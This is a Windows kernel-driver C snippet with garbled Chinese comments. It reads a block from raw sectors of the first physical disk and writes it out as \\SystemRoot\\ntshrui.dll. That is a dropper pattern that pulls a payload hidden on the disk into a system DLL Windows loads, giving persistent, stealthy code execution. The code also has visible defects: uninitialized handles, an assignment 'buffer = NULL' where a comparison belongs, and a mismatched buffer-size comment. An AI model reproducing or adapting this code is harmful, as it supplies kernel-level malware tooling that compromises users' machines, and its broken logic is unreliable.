BOOLEAN
MyCopyFile(
           IN PUNICODE_STRING    ustrDestFile,
           IN PUNICODE_STRING    ustrSrcFile
            )
{
    HANDLE	hSrcFile, hDestFile;
    PVOID	buffer = NULL;
    ULONG	length = 0;
    LARGE_INTEGER	offset = {0};
    IO_STATUS_BLOCK	Io_Status_Block = {0};
    OBJECT_ATTRIBUTES	obj_attrib;
    NTSTATUS	status;
    BOOLEAN		bRet = FALSE;


        // ��Դ�ļ�
        InitializeObjectAttributes(&obj_attrib,
								   ustrSrcFile,
								   OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
								   NULL,
								   NULL);
        status = ZwCreateFile(&hSrcFile,
							  GENERIC_READ,
							  &obj_attrib,
							  &Io_Status_Block,
							  NULL,
							  FILE_ATTRIBUTE_NORMAL,
							  FILE_SHARE_READ,
							  FILE_OPEN,
							  FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
							  NULL,
							  0);
        if (!NT_SUCCESS(status))
        {
			KdPrint(("Src ZwCreateFile Error\n"));
            bRet = FALSE;
            goto END;
        }
//The InitializeObjectAttributes macro initializes the opaque OBJECT_ATTRIBUTES structure, which specifies the properties of an object handle to routines that open handles.
        // ��Ŀ���ļ�
        InitializeObjectAttributes(&obj_attrib, 
								   ustrDestFile,
								   OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
								   NULL,
								   NULL);
        
        status = ZwCreateFile(&hDestFile,
							  GENERIC_WRITE,
							  &obj_attrib,
							  &Io_Status_Block,
							  NULL,
							  FILE_ATTRIBUTE_NORMAL,
							  FILE_SHARE_READ,
							  FILE_OPEN_IF,
							  FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
							  NULL,
							  0);
        if (!NT_SUCCESS(status))
        {
			KdPrint(("Dest ZwCreateFile Error\n"));
            bRet = FALSE;
            goto END;
        }

        // Ϊbuffer����4KB�ռ�
        buffer = ExAllocatePool(NonPagedPool, 6144);
        if (buffer == NULL)
        {
            bRet = FALSE;
            goto END;
        }

        // �����ļ�

            length = 5120;
	    offset.QuadPart = 6144;
            // ��ȡԴ�ļ�
            status = ZwReadFile(hSrcFile,
                            NULL,
                            NULL,
                            NULL,
                            &Io_Status_Block,
                            buffer,
                            length,
                            &offset,
                            NULL);
            if (!NT_SUCCESS(status))
            {
                // ���״̬ΪSTATUS_END_OF_FILE��˵���ļ��Ѿ���ȡ��ĩβ
                if (status == STATUS_END_OF_FILE)
                {
                    bRet = TRUE;
                    goto END;
                }
            }

            // ���ʵ�ʶ�ȡ�ĳ���
            length = Io_Status_Block.Information;

            // д�뵽Ŀ���ļ�
	    offset.QuadPart = 0;
            status = ZwWriteFile(hDestFile,
                                NULL,
                                NULL,
                                NULL,
                                &Io_Status_Block,
                                buffer,
                                length,
                                &offset,
                                NULL);
            if (!NT_SUCCESS(status))
            {
                bRet = FALSE;
                goto END;
            }
            
            // �ƶ��ļ�ָ��
            //offset.QuadPart += length;
        

    

END:
    if (hSrcFile)
    {
        ZwClose(hSrcFile);
    }
    if (hDestFile)
    {
        ZwClose(hDestFile);
    }
    if (buffer = NULL)
    {
        ExFreePool(buffer);
    }

    return bRet;
}	

RtlInitUnicodeString(&ustrSrcFile, L"\\??\\PHYSICALDRIVE0");//��ȡĿ���ļ�,��һ����
RtlInitUnicodeString(&ustrDestFile, L"\\SystemRoot\\ntshrui.dll");//д���ļ�SystemRootΪϵͳ����Ŀ¼����ϵͳ��C�̾���C:\windows
    if(MyCopyFile(&ustrDestFile, &ustrSrcFile))//����ZwCreateFile.ZwReadFile.ZwWriteFile�����ļ���ȡ��������
    {
		KdPrint(("[Test] CopyFile Success!"));
    }
    else
    {  
		KdPrint(("[Test] CopyFile Error!"));
    }